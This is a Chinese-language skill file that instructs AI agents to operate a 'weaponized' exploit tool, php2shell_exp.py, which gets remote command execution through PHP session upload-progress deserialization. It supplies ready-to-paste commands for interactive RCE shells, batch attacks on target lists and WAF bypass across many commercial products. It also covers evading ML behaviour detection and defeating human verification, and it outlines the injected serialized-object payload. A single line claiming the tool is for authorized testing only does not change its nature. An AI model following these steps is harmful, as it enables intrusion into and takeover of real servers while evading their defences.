---
name: php2shell-exp
description: CVE-2026-109618/109619 (PHP2Shell) 武器化 EXP 的完整使用技能。当任务涉及 php2shell、CVE-2026-109618、CVE-2026-109619、session.upload_progress 利用、PHP 反序列化对象注入验证、WAF 绕过渗透（阿里云/南墙/宝塔/云WAF/语义识别/人机验证/ML行为防御）、PHP RCE 验证、留 flag 测试时使用。支持 CMD/CLI/PowerShell/Agent 一键或拼参调用。
---

# php2shell-exp — 武器化 EXP 使用技能

> 读完本技能即可直接操作 `php2shell_exp.py`。所有命令可拼接参数+目标即用，无需交互。

## 0. 能力速览

- **核心能力 = RCE（任意命令执行）**。`shell` 是主接口（单命令/命令循环）；flag.txt 只是授权测试场景之一。
- **目标**：PHP 5.4~8.5.11 全系（5.4~8.1 EOL 官方无修复）的 `session.upload_progress` 利用（CVE-2026-109618/619）。
- **全流程自动**：防御识别（6 层）→ WAF 指纹选模板 → 自动绕过 → hijack/uaf/inject 三链利用 → 后续操作 → 停火 → JSONL 报告。
- **WAF 对抗**：阿里云 WAF/ESA、南墙 NQWAF、宝塔 bt_panel、Cloudflare、ModSecurity、安全狗、云锁、多层堆叠；语义识别（`S:` 转义/`O:+N:` oracle）、体积策略（流式分片）、人机验证（Cookie/solver）、ML 行为预算（jitter/诱饵/退避）。
- **关键技术**：`session.upload_progress.cleanup=Off` 是 hijack 链**硬前提**（官方 8.2.34 实测：
  会话仅在 multipart 解析完成时写盘，上传中 sess 文件 0B；cleanup=On 时写盘与删键同请求完成、
  无跨请求窗口）。`--seed-mode full`（默认）= 公开 PoC 形态；`abort` = 实验模式。
- **零依赖**：Python 3.8+ 纯标准库；无 pip、无浏览器、无编译。

## 0.1 RCE 主接口（记住这一个就够）

```bash
# 一键稳定 shell 通道（端点/gadget/prop/分隔符全自动发现，自动 RCE 建链）
python php2shell_exp.py shell https://TARGET/
# Agent/AI 集成（stdout 每行 JSON，可直接管道解析）
python php2shell_exp.py shell https://TARGET/ --json
# 精确指定端点/gadget（跳过探测）
python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH --gadget GADGET --prop PROP --cmd "COMMAND"
```

> 通道机制：标记限界提取（`__P2S_B/E_<tok>__`，括号分组使 stderr 整链归并）→ 输出零噪声；
> 自动识别 sh `;` / cmd.exe `&` 分隔符；瞬时抖动自动重试；stdin 净化 BOM/零宽字符。
> 建链信息在 stderr，stdout 纯输出（Agent 可直接消费）。

## 1. 文件与入口

```
php2shell_exp.py        # 唯一可执行入口（单文件，可整体拷贝到任意 PATH）
USAGE.md                # 参数总表（细节备查）
Readme.md               # 使用说明 + 免责声明 + 多场景调用模板
BYPASS_TECHNIQUES.md    # 绕过技术文档（实证标注 ✅/🧪/📚 + 蓝队附录，即判读基准）
RESEARCH.md             # 联网取证 + 官方补丁逆向 + EXP 真实性差异对照（机制依据）
TEST_REPORT.md          # 本地确定性测试报告（12 用例矩阵 + 通用性结论）
CHANGELOG.md            # 更新日志（版本历史与变更明细）
tests/                  # 轻量自测（python -m unittest discover -s tests）
flag.sample.txt         # flag 落地产物示例（实际 flag.txt 由 --flag-cmd 在目标端生成）
```

调用约定：`python php2shell_exp.py <子命令> [目标] [参数]`。
子命令：`auto`（全自动，首选）· `check`（被动指纹）· `exploit`（手动单链）· `build`（离线出包）。

## 2. 标准作业流程（Agent 照抄即可）

```bash
# STEP 1 侦察（被动、只读 GET）——拿到 PHP 版本/WAF 堆叠/补丁判定
python php2shell_exp.py check https://TARGET/

# STEP 2 全自动利用 + flag 落地（一条命令完成全部）
python php2shell_exp.py auto https://TARGET/ \
  --bypass-level 3 --try-all --jitter 8 \
  --flag-cmd "echo hello word > flag.txt && cat flag.txt" --flag-expect "hello word" \
  -o report.jsonl

# STEP 3 解析结果（读 report.jsonl 最后一行 JSON）
#   verdict=="rce_confirmed" && flag_stage.rce_hit==true  => 测试完成，停止
```

判定与动作决策树：

```
verdict=rce_confirmed        → 完成（flag_stage.rce_hit=true 即 flag 已落地）→ 停火
verdict=armed                → upload_progress 已激活 → 用 exploit 模式换 gadget/变体续打
verdict=crash_signal         → CVE-2026-109619 崩溃触发命中（plant→OOM→悬垂复用）；RCE 需人工续做（sink+泄漏+堆排布）
verdict=challenge_blocked    → 人机验证 → 重跑加 --warmup，或 --cookie "k=v;..." 导入已验证会话，
                               或 --solver-cmd "<外部求解器>"（stdout 输出放行 Cookie 串）
verdict=post_blocked         → POST 方法策略封禁（看 post_block_codes）→ 需加白/源站面/换出口 IP
verdict=likely_vulnerable_no_rce → 版本面漏洞但链未中 → 扩 --gadget-wordlist/--seed-path 精确路径重试
verdict=skipped_patched      → 已修补 → 跳过（除非 --force）
```

## 3. 多环境调用模板

### CMD（Windows，一键）
```cmd
python php2shell_exp.py auto https://TARGET/ --try-all --flag-cmd "echo hello word > flag.txt && type flag.txt"
echo EXIT=%ERRORLEVEL%
```

### PowerShell（含结果解析）
```powershell
python php2shell_exp.py auto https://TARGET/ --try-all --flag-cmd "echo hello word > flag.txt && cat flag.txt" -o r.jsonl
$r = Get-Content r.jsonl | Select-Object -Last 1 | ConvertFrom-Json
if ($r.verdict -eq 'rce_confirmed' -and $r.flag_stage.rce_hit) { "FLAG OK: $($r.flag_stage.body)" } else { "verdict=$($r.verdict)" }
```

### Bash / CLI（批量）
```bash
python php2shell_exp.py auto -f targets.txt --workers 8 --jitter 8 --rounds 5 --sleep 60 -o report.jsonl
jq -r 'select(.verdict=="rce_confirmed")|.target+" via="+(.via//"")' report.jsonl
```

### Agent 拼参规则（重要）
- 目标永远放在子命令后第一个位置参数：`auto https://TARGET/`。
- 任何参数都可省略；省略即用安全默认（默认命令=无害标记 `echo P2S_<token>`，只回显不写文件）。
- 需要留 flag 的授权测试：**必加** `--flag-cmd "echo hello word > flag.txt && cat flag.txt" --flag-expect "hello word"`。
- 不确定防御时**永远加** `--try-all`（全量策略逐一尝试，命中即停）。
- 多层/行为防御强的环境：加 `--jitter 8 --rounds 5 --sleep 60`。
- 已知精确路径时用 `exploit` 子命令压到 2 请求（见下）。

### exploit 精确射击（最小请求量）
```bash
python php2shell_exp.py exploit https://TARGET/ --chain hijack \
  --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH \
  --gadget GADGET --prop PROP --cmd "COMMAND" --expect "MARKER"
```

## 4. 参数速查（完整表见 USAGE.md）

| 你要做什么 | 参数 |
| --- | --- |
| 全自动+留 flag | `auto URL --try-all --flag-cmd "..." --flag-expect "hello word"` |
| 只识别防御 | `check URL` |
| 全量策略轮打 | `--try-all` |
| 指定 WAF 强度 | `--bypass-level 0..3`（默认 3） |
| 过人机验证 | `--warmup` / `--cookie "k=v"` / `--solver-cmd "cmd"` |
| 对抗 ML/频控 | `--jitter 8 --rounds 5 --sleep 60` |
| 自定义命令 | `--cmd "COMMAND"` + `--expect "MARKER"` |
| 精确端点 | `--seed-path P --trigger-path P` |
| 扩 gadget | `--gadget-wordlist f.txt --prop-wordlist f.txt` |
| uaf 链 | `--uaf-size-mb 12 --stall 1.5`（plant→解码 OOM→悬垂复用；只判 crash_signal） |
| 批量 | `-f targets.txt --workers 8 -o report.jsonl` |
| 结果续跑 | 同 `-o` 文件自动跳过已 `rce_confirmed` 目标 |

退出码：`0`=RCE 确认 `2`=疑似/崩溃/armed `1`=全不可达 `3`=单链未中 `4`=无发现。

## 5. 输出解析契约（Agent 集成）

`-o` 文件为 JSONL，每行一个目标结果对象：

```json
{
  "target": "https://TARGET/", "verdict": "rce_confirmed", "via": "hijack:/app/seed.php:/api/app.php:Logger",
  "fingerprint": {"banner": "PHP/8.2.34", "status": "likely_vulnerable", "waf": "aliyun_waf"},
  "defense": {"profile": "aliyun_waf", "layers": [{"layer": "semantic", "name": "payload-scoring"}],
              "evidence": {"size_probe": {"1500B": 404, "3000B": 403}}},
  "adaptive": "semantic->plus_len/serp_hex",
  "chains": [{"chain": "hijack", "strategy": "plus_len", "steps": [{"step": "seed", "http": 404}],
              "rce_hit": true, "decode_warning": true}],
  "flag_stage": {"cmd": "echo hello word > flag.txt && cat flag.txt", "rce_hit": true, "body": "hello word"}
}
```

关键字段：`verdict`（终判）、`via`（命中链）、`defense.layers`（防御画像）、`adaptive`（触发的自动绕过）、
`flag_stage.rce_hit`（后续操作是否成功）、`chains[].strategy`（实际生效的绕过策略）；
uaf 链日志含 `steps[]`/`oom_signal`/`crash_signal`（触发细节见 USAGE §9）；
一键通杀辅助：`chain_prereq`（present=gadget 问题 / absent=前提缺失）+ `chain_prereq_hint`（修复指引）。

## 6. 背景知识（判定原理，供推理用；依据 RESEARCH.md 取证）

- **CVE 映射**（官方 GHSA）：109618 = "RCE via OOM corruption"（OOM/longjmp 状态破坏）；
  109619 = "RCE via stale global state"（`BG(unserialize)` 跨请求悬垂，rinit 顺序 bug）。
  handler 混淆 → `__destruct` 链（本 EXP 主链）由同一补丁以 `incomplete_classes_only` 关闭。
- **hijack 链**（首选，公开 PoC 实测 RCE）：投毒 POST（`PHPSESSID` 表单字段 +
  `PHP_SESSION_UPLOAD_PROGRESS=|O:6:"GADGET":1:{...}` + 文件分部）
  → 触发 GET（同 SID）→ php 解码器按首个 `|` 切分实例化对象 → 尾部垃圾强制 decode 失败 →
  清理期 `__destruct` 执行。响应中命令输出**先于** `Failed to decode session object` 告警即命中。
- **PHP 7.4 兼容**：`O:+N:`（长度 `+` 号）、`S:` 转义（5.2.1+）变形均被接受（公开 WP 验证）。
- **修复版本**：8.5.12 / 8.4.27 / 8.3.36 / 8.2.35（2026-10-21，仅受支持分支）；5.4~8.1 EOL 无官方修复。
- **WAF 绕过要点**：语义规则 `/O:[0-9]+:/` → `S:` 转义 / `O:+N:`（均 PHP 有效）；体积规则 ~2KB →
  chunked 流式分片；行为预算 → jitter/诱饵/退避；boundary 必须浏览器化（`----php2shell*` 是 IoC）。

## 6.1 成链前提与已知限制（推理必备，避免误判）

hijack 链生效的**全部前提**（缺一则链不成立，与 EXP 质量无关）：
1. seed 目录 `session.serialize_handler=php_serialize`，trigger 目录为默认 `php`（per-directory
   `.htaccess`/`.user.ini` 造成不一致，共享同一 `session.save_path`）；`|` 是 php 编码器的拒写约束
   （session.c:1148-54），只有 php_serialize 能把带 `|` 的投毒键写进会话；
2. trigger 端点在 `session_start()` **之前**定义了 gadget 类（或存在 POP 链）；
3. `session.upload_progress.enabled=On`（默认开）；`session.upload_progress.cleanup=Off`
   （**硬前提**——官方实测 cleanup=On 无跨请求窗口；公开 PoC lab 均设 Off）；
4. `session.use_strict_mode=0`（默认）；SID 走 `PHPSESSID` 表单字段可绕过 `use_only_cookies=On`
   （PR #22113 取证），EXP 同时发 Cookie+字段双通道；SID 字符集 `[a-zA-Z0-9,-]`。
判定红线：响应中命令输出**先于** `Failed to decode session object` 告警 = 命中；
仅告警无输出 = gadget/属性不对 或 seed 未持久化（`cleanup=On`）；无告警 = 端点/处理器前提
不满足。**不能单凭告警断定已修补**——官方 8.2.35 实测 per-directory 混淆链仍可利用，
补丁判据以 `check` 版本面为准。

## 7. 安全默认与作业边界

- 默认载荷无害（`echo P2S_<token>` 回显）；写文件/执行其他命令必须显式 `--cmd/--flag-cmd`。
- 命中 `rce_confirmed` 自动停火；flag 阶段是唯一后续操作；无后门、无持久化、无配置改动。
- 仅用于已授权测试目标；请求速率经 `--jitter/--rounds/--sleep` 可控，避免压测型流量。

## 8. 快速排障

| 现象 | 处理 |
| --- | --- |
| 全部 403 但 check 正常 | 行为预算惩罚窗口 → `--jitter 8 --rounds 5 --sleep 60` 或换出口 |
| seed 404/200 但 rce=False | 端点/gadget 不对 → `--seed-path/--trigger-path` 精确指定 + `--gadget-wordlist` |
| `challenge_blocked` | `--warmup` 后重试；仍拦则 `--cookie`/`--solver-cmd` |
| `post_blocked` | 看 `post_block_codes`；方法策略需加白或源站面 |
| chunked 报 400/断连 | 该边缘不收 TE → 自适应已内置切换，或 `--bypass-level 2` |
| uaf 无崩溃 | `--uaf-size-mb` 需大于目标 `memory_limit`（公开 PoC 12MB/8M）；三请求需同 worker（`pm.max_children=1` 或重试）；fire 会话必须小 |
